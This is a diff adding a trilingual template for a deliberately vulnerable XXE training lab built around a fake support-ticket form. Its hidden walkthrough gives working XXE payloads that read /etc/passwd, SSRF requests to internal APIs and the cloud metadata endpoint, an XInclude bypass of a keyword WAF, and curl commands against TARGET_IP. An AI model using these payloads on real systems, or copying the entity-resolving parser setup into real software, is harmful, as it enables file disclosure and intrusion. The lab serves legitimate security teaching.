@@ -1,0 +1,497 @@
+{% extends "base.html" %}
+{% block title %}V26 – XXE – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400" data-i18n="xxe_obj_desc">La API de tickets procesa XML con entidades externas habilitadas. Explota XXE para leer un archivo local del servidor; su contenido (la flag) vuelve en la respuesta JSON.</p>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="obj_flag_lbl">Flag:</strong> <code>HackLabs{···}</code> <span data-i18n="obj_flag_hint">— valídala en la caja «Validar Flag» al final de esta página.</span></p>
+  </div>
+
+  <div class="hl-card mb-4">
+    <div class="flex items-center gap-2 mb-4">
+      <svg class="w-5 h-5 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M7 8h10M7 12h4m1 8l-4-4H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-3l-4 4z"/></svg>
+      <h2 class="text-base font-bold text-gray-800 dark:text-white" data-i18n="xxe_form_title">Crear Ticket de Soporte</h2>
+    </div>
+    <form id="ticketForm" class="space-y-3">
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="xxe_lbl_full_name">Nombre completo</label>
+          <input type="text" name="name" class="hl-input" data-i18n-placeholder="xxe_ph_name" placeholder="Juan Pérez" required>
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="xxe_lbl_email">Email</label>
+          <input type="email" name="email" class="hl-input" data-i18n-placeholder="xxe_ph_email" placeholder="juan@empresa.com" required>
+        </div>
+      </div>
+      <div class="grid grid-cols-1 sm:grid-cols-2 gap-3">
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="xxe_lbl_department">Departamento</label>
+          <select name="subject" class="hl-input">
+            <option value="Soporte Técnico" data-i18n="xxe_opt_support">Soporte Técnico</option>
+            <option value="Ventas" data-i18n="xxe_opt_sales">Ventas</option>
+            <option value="Recursos Humanos" data-i18n="xxe_opt_hr">Recursos Humanos</option>
+            <option value="Administración" data-i18n="xxe_opt_admin">Administración</option>
+            <option value="Seguridad IT" data-i18n="xxe_opt_security">Seguridad IT</option>
+          </select>
+        </div>
+        <div>
+          <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="xxe_lbl_priority">Prioridad</label>
+          <select id="priority" class="hl-input">
+            <option value="baja" data-i18n="xxe_opt_low">🟢 Baja</option>
+            <option value="media" selected data-i18n="xxe_opt_medium">🟡 Media</option>
+            <option value="alta" data-i18n="xxe_opt_high">🟠 Alta</option>
+            <option value="critica" data-i18n="xxe_opt_critical">🔴 Crítica</option>
+          </select>
+        </div>
+      </div>
+      <div>
+        <label class="block text-xs text-gray-500 dark:text-gray-400 mb-1 font-medium" data-i18n="xxe_lbl_description">Descripción del problema</label>
+        <textarea name="message" rows="3" class="hl-input" data-i18n-placeholder="xxe_ph_message" placeholder="Describe el problema con detalle..." required></textarea>
+      </div>
+      <button type="submit" class="btn-primary w-full sm:w-auto">
+        <svg class="w-4 h-4 inline mr-1 -mt-0.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"/></svg>
+        <span data-i18n="xxe_btn_send">Enviar Ticket</span>
+      </button>
+    </form>
+  </div>
+
+  <!-- ── Resultado (ticket creado) ──────────────────────── -->
+  <div id="ticketResult" class="hl-card mb-4 border-l-4 hidden" style="border-left-color:var(--hl-primary)">
+    <div class="flex items-center gap-2 mb-3">
+      <svg class="w-5 h-5" style="color:var(--hl-primary)" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+      <span class="text-sm font-bold" style="color:var(--hl-primary)" data-i18n="xxe_ticket_created">Ticket creado con éxito</span>
+      <span id="ticketId" class="ml-auto text-xs font-mono bg-gray-100 dark:bg-gray-800 px-2 py-0.5 rounded"></span>
+    </div>
+    <div class="space-y-1.5 font-mono text-sm">
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0" data-i18n="xxe_name">Nombre:</span><span id="resName" class="text-gray-800 dark:text-gray-200 break-all"></span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0" data-i18n="xxe_email">Email:</span><span id="resEmail" class="text-gray-800 dark:text-gray-200 break-all"></span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0" data-i18n="xxe_subject">Asunto:</span><span id="resSubject" class="text-gray-800 dark:text-gray-200 break-all"></span></div>
+      <div class="flex gap-2"><span class="text-gray-400 w-24 flex-shrink-0" data-i18n="xxe_message">Mensaje:</span><span id="resMessage" class="text-gray-800 dark:text-gray-200 break-all whitespace-pre-wrap"></span></div>
+    </div>
+  </div>
+
+  <!-- ── Error ──────────────────────────────── -->
+  <div id="ticketError" class="alert-error mb-4 text-xs font-mono hidden"></div>
+
+  <!-- ── Tickets recientes (decorativo) ────────────────── -->
+  <div class="hl-card mb-4 opacity-75">
+    <div class="text-xs font-semibold text-gray-500 dark:text-gray-400 mb-3 uppercase tracking-wide" data-i18n="xxe_recent_tickets">Tickets recientes</div>
+    <div class="overflow-x-auto">
+      <table class="w-full text-xs">
+        <thead>
+          <tr class="text-left text-gray-400 border-b border-gray-200 dark:border-gray-700">
+            <th class="pb-2 pr-3 font-medium">ID</th>
+            <th class="pb-2 pr-3 font-medium" data-i18n="xxe_col_user">Usuario</th>
+            <th class="pb-2 pr-3 font-medium" data-i18n="xxe_col_subject">Asunto</th>
+            <th class="pb-2 font-medium" data-i18n="xxe_col_status">Estado</th>
+          </tr>
+        </thead>
+        <tbody id="recentTicketsBody" class="text-gray-600 dark:text-gray-400">
+          <tr class="border-b border-gray-100 dark:border-gray-800"><td class="py-1.5 pr-3 font-mono">TK-83421</td><td class="pr-3">María López</td><td class="pr-3" data-i18n="xxe_opt_support">Soporte Técnico</td><td><span class="text-green-500" data-i18n="xxe_status_resolved">✓ Resuelto</span></td></tr>
+          <tr class="border-b border-gray-100 dark:border-gray-800"><td class="py-1.5 pr-3 font-mono">TK-83419</td><td class="pr-3">Carlos Ruiz</td><td class="pr-3" data-i18n="xxe_opt_security">Seguridad IT</td><td><span class="text-yellow-500" data-i18n="xxe_status_pending">⏳ Pendiente</span></td></tr>
+          <tr><td class="py-1.5 pr-3 font-mono">TK-83415</td><td class="pr-3">Ana Martín</td><td class="pr-3" data-i18n="xxe_opt_admin">Administración</td><td><span class="text-green-500" data-i18n="xxe_status_resolved">✓ Resuelto</span></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
+
+<!-- ── Resolución ─────────────────────────────────────── -->
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Análisis de la vulnerabilidad</h3>
+    <p>El formulario de tickets envía los datos al servidor como <strong>XML</strong> (Content-Type: application/xml). El parser del backend (<code>lxml</code>) tiene habilitada la resolución de entidades externas, lo que permite XXE.</p>
+
+    <h3>Pasos de explotación con Burp Suite</h3>
+    <ol>
+      <li>Abre <strong>Burp Suite</strong> y configura el proxy del navegador.</li>
+      <li>Rellena el formulario de tickets con cualquier dato y pulsa <strong>"Enviar Ticket"</strong>.</li>
+      <li>En Burp → <strong>Proxy → HTTP history</strong>, localiza la petición <code>POST /xxe/api</code>.</li>
+      <li>Haz clic derecho → <strong>Send to Repeater</strong>.</li>
+      <li>En Repeater, <strong>sustituye el cuerpo XML completo</strong> por la inyección XXE y pulsa <strong>Send</strong>. La respuesta (JSON) aparece en el panel derecho de Repeater — la flag estará en el campo <code>name</code> del ticket y en el campo <code>flag</code> si el archivo extraído coincide.</li>
+      <li><strong>Easy:</strong> Sin filtro. Inyecta directamente una entidad XXE:</li>
+    </ol>
+    <h4>Leer /etc/passwd (Easy)</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>Leer la flag dedicada</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe_flag.txt"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+    <p>La flag dedicada del lab se incluirá en el campo <code>flag</code> de la respuesta JSON cuando el contenido extraído coincida con la flag del lab.</p>
+
+    <h4>SSRF – Acceder a servicios internos</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <ol start="6">
+      <li><strong>Medium:</strong> Bloquea el protocolo <code>file://</code>. Bypass con SSRF usando <code>http://</code>:
+        <pre># Lee la API interna de usuarios
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:5000/api/users"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;x&lt;/email&gt;
+  &lt;subject&gt;x&lt;/subject&gt;
+  &lt;message&gt;x&lt;/message&gt;
+&lt;/ticket&gt;
+
+# SSRF a metadatos cloud
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
+        El filtro bloquea <code>file://</code> pero no <code>http://</code> — permite SSRF a servicios internos.</li>
+      <li><strong>Hard:</strong> El WAF bloquea <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code> y <code>PUBLIC</code> — el XXE clásico y XXEinjector (que genera un <code>&lt;!DOCTYPE&gt;</code> para OOB) fallan por diseño. El flag <code>--phpfilter</code> además solo funciona en apps PHP, no en Python/Flask.
+        <br><br>Bypass con <strong>XInclude</strong> — una especificación XML distinta que no contiene ninguna de las palabras bloqueadas:
+        <pre>&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+        El backend llama a <code>lxml.XInclude()</code> tras parsear → el elemento <code>&lt;xi:include&gt;</code> se sustituye por el contenido del archivo. El WAF no lo detecta porque ninguna de sus palabras clave aparece en el payload.</li>
+    </ol>
+
+    <h3>¿Por qué funciona?</h3>
+    <ul>
+      <li>El servidor parsea directamente el XML del cliente con <code>lxml</code> usando <code>resolve_entities=True</code> y <code>load_dtd=True</code>.</li>
+      <li>Esto permite definir entidades que el parser resuelve leyendo archivos locales (<code>file://</code>) o realizando peticiones HTTP (<code>http://</code>).</li>
+      <li>El valor expandido se refleja en la respuesta JSON → el atacante ve el contenido.</li>
+    </ul>
+
+    <h3>Cómo descubrirlo en un pentest real</h3>
+    <ul>
+      <li>Interceptar tráfico en Burp y buscar peticiones con <code>Content-Type: application/xml</code> o <code>text/xml</code>.</li>
+      <li>Cualquier endpoint que acepte XML es candidato a XXE.</li>
+      <li>Probar inyecciones de DOCTYPE en el body y observar si el servidor refleja, produce errores o cambia de comportamiento.</li>
+    </ul>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
+
+    <h3>Explotación con curl</h3>
+    <pre># Easy: entidad clásica
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'
+
+# Hard: bypass con XInclude (no usa DOCTYPE ni ENTITY)
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Vulnerability Analysis</h3>
+    <p>The ticket form sends data to the server as <strong>XML</strong> (Content-Type: application/xml). The backend parser (<code>lxml</code>) has external entity resolution enabled, allowing XXE.</p>
+
+    <h3>Exploitation Steps with Burp Suite</h3>
+    <ol>
+      <li>Open <strong>Burp Suite</strong> and configure the browser proxy.</li>
+      <li>Fill in the ticket form with any data and click <strong>"Submit Ticket"</strong>.</li>
+      <li>In Burp → <strong>Proxy → HTTP history</strong>, find the <code>POST /xxe/api</code> request.</li>
+      <li>Right-click → <strong>Send to Repeater</strong>.</li>
+      <li>In Repeater, <strong>replace the entire XML body</strong> with your XXE injection and click <strong>Send</strong>. The response (JSON) appears in the right panel of Repeater — the flag will be in the <code>name</code> field of the ticket and in the <code>flag</code> field if the extracted file matches.</li>
+      <li><strong>Easy:</strong> No filter. Inject an XXE entity directly:</li>
+    </ol>
+    <h4>Read /etc/passwd (Easy)</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>Read the dedicated flag</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe_flag.txt"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+    <p>The dedicated lab flag will be included in the <code>flag</code> field of the JSON response when the extracted content matches the lab flag.</p>
+
+    <h4>SSRF – Access internal services</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <ol start="7">
+      <li><strong>Medium:</strong> Blocks <code>file://</code> protocol. Bypass with SSRF using <code>http://</code>:
+        <pre># Read internal API
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:5000/api/users"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;x&lt;/email&gt;
+  &lt;subject&gt;x&lt;/subject&gt;
+  &lt;message&gt;x&lt;/message&gt;
+&lt;/ticket&gt;
+
+# SSRF to cloud metadata
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
+        Filter blocks <code>file://</code> but not <code>http://</code> — allows SSRF to internal services.</li>
+      <li><strong>Hard:</strong> The WAF blocks <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code> and <code>PUBLIC</code> — classic XXE and XXEinjector (which generates a <code>&lt;!DOCTYPE&gt;</code> for OOB) fail by design. The <code>--phpfilter</code> flag also only works on PHP apps, not Python/Flask.
+        <br><br>Bypass with <strong>XInclude</strong> — a different XML spec that uses none of the blocked keywords:
+        <pre>&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+        The backend calls <code>lxml.XInclude()</code> after parsing → the <code>&lt;xi:include&gt;</code> element is replaced with the file contents. The WAF doesn't catch it because none of its keywords appear in the payload.</li>
+    </ol>
+
+    <h3>Why does it work?</h3>
+    <ul>
+      <li>The server parses client XML directly with <code>lxml</code> using <code>resolve_entities=True</code> and <code>load_dtd=True</code>.</li>
+      <li>This allows defining entities that the parser resolves by reading local files (<code>file://</code>) or making HTTP requests (<code>http://</code>).</li>
+      <li>The expanded value is reflected in the JSON response → the attacker sees the contents.</li>
+    </ul>
+
+    <h3>How to discover it in a real pentest</h3>
+    <ul>
+      <li>Intercept traffic in Burp and look for requests with <code>Content-Type: application/xml</code> or <code>text/xml</code>.</li>
+      <li>Any endpoint accepting XML is a candidate for XXE.</li>
+      <li>Try injecting DOCTYPE in the body and observe if the server reflects, errors out, or changes behavior.</li>
+    </ul>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
+
+    <h3>Exploitation with curl</h3>
+    <pre># Easy: classic entity
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'
+
+# Hard: XInclude bypass (no DOCTYPE, no ENTITY)
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
+  </div>
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Análise de vulnerabilidade</h3>
+    <p>O formulário de chamado envia dados para o servidor como <strong>XML</strong> (Content-Type: application/xml). O analisador no backend (<code>lxml</code>) possui resolução de entidades externas habilitada, permitindo XXE.</p>
+
+    <h3>Passos de exploração com Burp Suite</h3>
+    <ol>
+      <li>Abra o <strong>Burp Suite</strong> e configure o proxy do navegador.</li>
+      <li>Preencha o formulário de chamados com qualquer informação e clique em <strong>"Enviar Ticket"</strong>.</li>
+      <li>No Burp → <strong>Proxy → HTTP history</strong>, localize a requisição <code>POST /xxe/api</code>.</li>
+      <li>Clique com o botão direito → <strong>Send to Repeater</strong>.</li>
+      <li>No Repeater, <strong>substitua todo o corpo XML</strong> pela sua injeção XXE e clique em <strong>Send</strong>. A resposta (JSON) é exibida no painel direito do Repeater — a flag estará no campo <code>name</code> do chamado e no campo <code>flag</code> se o arquivo extraído for compatível.</li>
+      <li><strong>Fácil:</strong> Sem filtro. Injete diretamente uma entidade XXE:</li>
+    </ol>
+    <h4>Ler /etc/passwd (Fácil)</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <h4>Ler a flag dedicada</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "file:///app/secret/xxe_flag.txt"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+    <p>A flag dedicada do laboratório será incluída no campo <code>flag</code> da resposta JSON quando o conteúdo extraído coincidir com a flag do laboratório.</p>
+
+    <h4>SSRF – Acessar serviços internos</h4>
+    <pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+
+    <ol start="7">
+      <li><strong>Médio:</strong> Bloqueia o protocolo <code>file://</code>. Bypass com SSRF usando <code>http://</code>:
+        <pre># Lê a API interna de usuários
+&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE ticket [
+  &lt;!ENTITY xxe SYSTEM "http://localhost:5000/api/users"&gt;
+]&gt;
+&lt;ticket&gt;
+  &lt;name&gt;&amp;xxe;&lt;/name&gt;
+  &lt;email&gt;x&lt;/email&gt;
+  &lt;subject&gt;x&lt;/subject&gt;
+  &lt;message&gt;x&lt;/message&gt;
+&lt;/ticket&gt;
+
+# SSRF para metadados de nuvem
+&lt;!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"&gt;</pre>
+        O filtro bloqueia <code>file://</code>, mas não <code>http://</code> — permite SSRF para serviços internos.</li>
+      <li><strong>Difícil:</strong> O WAF bloqueia <code>DOCTYPE</code>, <code>ENTITY</code>, <code>SYSTEM</code> e <code>PUBLIC</code> — o XXE clássico e o XXEinjector (que gera um <code>&lt;!DOCTYPE&gt;</code> para OOB) falham por design. A flag <code>--phpfilter</code> também só funciona em aplicações PHP, não em Python/Flask.
+        <br><br>Bypass com <strong>XInclude</strong> — uma especificação XML diferente que não utiliza nenhuma das palavras-chave bloqueadas:
+        <pre>&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;
+  &lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;
+  &lt;email&gt;test@test.com&lt;/email&gt;
+  &lt;subject&gt;test&lt;/subject&gt;
+  &lt;message&gt;test&lt;/message&gt;
+&lt;/ticket&gt;</pre>
+        O backend executa <code>lxml.XInclude()</code> após o parsing → o elemento <code>&lt;xi:include&gt;</code> é substituído pelo conteúdo do arquivo. O WAF não o detecta porque nenhuma de suas palavras-chave aparece no payload.</li>
+    </ol>
+
+    <h3>Por que funciona?</h3>
+    <ul>
+      <li>O servidor faz o parse direto do XML do cliente com <code>lxml</code> utilizando <code>resolve_entities=True</code> e <code>load_dtd=True</code>.</li>
+      <li>Isso permite definir entidades que o parser resolve lendo arquivos locais (<code>file://</code>) ou realizando requisições HTTP (<code>http://</code>).</li>
+      <li>O valor expandido é refletido na resposta JSON → o invasor visualiza o conteúdo.</li>
+    </ul>
+
+    <h3>Como descobrir em um pentest real</h3>
+    <ul>
+      <li>Intercepte o tráfego no Burp e procure requisições com <code>Content-Type: application/xml</code> ou <code>text/xml</code>.</li>
+      <li>Qualquer endpoint que aceite XML é candidato a XXE.</li>
+      <li>Teste injeções de DOCTYPE no corpo da requisição e observe se o servidor reflete, gera erros ou altera o comportamento.</li>
+    </ul>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">Burp Suite</span> <span class="tools-badge">XXEinjector</span> <span class="tools-badge">curl</span></div>
+
+    <h3>Exploração com curl</h3>
+    <pre># Fácil: entidade clássica
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE t [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;ticket&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'
+
+# Difícil: bypass com XInclude (sem DOCTYPE ou ENTITY)
+curl -X POST http://TARGET_IP/xxe/api \
+  -H "Content-Type: application/xml" \
+  -d '&lt;ticket xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;name&gt;&lt;xi:include href="file:///etc/passwd" parse="text"/&gt;&lt;/name&gt;&lt;email&gt;x&lt;/email&gt;&lt;subject&gt;x&lt;/subject&gt;&lt;message&gt;x&lt;/message&gt;&lt;/ticket&gt;'</pre>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+document.getElementById('ticketForm').addEventListener('submit', function(e) {
+  e.preventDefault();
+
+  const form = e.target;
+  const name    = form.querySelector('[name="name"]').value;
+  const email   = form.querySelector('[name="email"]').value;
+  const subject = form.querySelector('[name="subject"]').value;
+  const message = form.querySelector('[name="message"]').value;
+
+  // Construir XML con declaración para compatibilidad con Burp Suite / parsers estrictos
+  const xml = `<?xml version="1.0" encoding="UTF-8"?>
+<ticket>
+  <name>${name}</name>
+  <email>${email}</email>
+  <subject>${subject}</subject>
+  <message>${message}</message>
+</ticket>`;
+
+  fetch('/xxe/api', {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/xml' },
+    body: xml
+  })
+  .then(r => r.json())
+  .then(data => {
+    const resultDiv = document.getElementById('ticketResult');
+    const errorDiv  = document.getElementById('ticketError');
+
+    if (data.status === 'ok') {
+      errorDiv.classList.add('hidden');
+      resultDiv.classList.remove('hidden');
+      document.getElementById('ticketId').textContent = data.ticket.id;
+      document.getElementById('resName').textContent    = data.ticket.name;
+      document.getElementById('resEmail').textContent   = data.ticket.email;
+      document.getElementById('resSubject').textContent = data.ticket.subject;
+      document.getElementById('resMessage').textContent = data.ticket.message;
+      if (data.flag) {
+        document.getElementById('resMessage').textContent += `\n\nFLAG: ${data.flag}`;
+      }
+
+      const tbody = document.getElementById('recentTicketsBody');
+      if (tbody) {
+        const row = document.createElement('tr');
+        row.className = 'border-b border-gray-100 dark:border-gray-800';
+        const currentLang = localStorage.getItem('hl_lang') || 'es';
+        const pendingLabel = currentLang === 'en' ? '⏳ Pending' : (currentLang === 'pt' ? '⏳ Pendente' : '⏳ Pendiente');
+        row.innerHTML = `
+          <td class="py-1.5 pr-3 font-mono">${data.ticket.id}</td>
+          <td class="pr-3">${(data.ticket.name || '').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</td>
+          <td class="pr-3">${(data.ticket.subject || '').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</td>
+          <td><span class="text-yellow-500">${pendingLabel}</span></td>
+        `;
+        tbody.prepend(row);
+      }
+    } else {
+      resultDiv.classList.add('hidden');
+      errorDiv.classList.remove('hidden');
+      errorDiv.textContent = data.message;
+    }
+  })
+  .catch(err => {
+    const errorDiv = document.getElementById('ticketError');
+    document.getElementById('ticketResult').classList.add('hidden');
+    errorDiv.classList.remove('hidden');
+    const currentLang = localStorage.getItem('hl_lang') || 'es';
+    const connError = currentLang === 'en' ? 'Connection error: ' : (currentLang === 'pt' ? 'Erro de conexão: ' : 'Error de conexión: ');
+    errorDiv.textContent = connError + err.message;
+  });
+});
+</script>
+{% endblock %}
